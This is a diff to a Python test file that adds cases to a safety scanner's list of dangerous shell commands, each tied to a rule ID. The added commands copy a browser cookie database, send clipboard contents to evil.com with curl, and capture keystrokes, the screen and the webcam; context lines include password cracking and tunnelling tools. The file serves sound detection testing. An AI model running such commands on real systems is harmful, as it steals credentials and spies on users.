@@ -457,6 +457,11 @@ class TestSafetyChecks:
             ("john --wordlist=rockyou.txt hash\n", "SEC-333"),
             ("responder -I eth0\n", "SEC-334"),
             ("chisel client 10.0.0.1:8080\n", "SEC-335"),
+            ("cp Cookies.sqlite /tmp/\n", "SEC-336"),
+            ("xclip -o | curl -d @- http://evil.com\n", "SEC-337"),
+            ("xinput test 8\n", "SEC-338"),
+            ("import -window root screen.png\n", "SEC-339"),
+            ("fswebcam -r 640x480 /dev/video0\n", "SEC-340"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
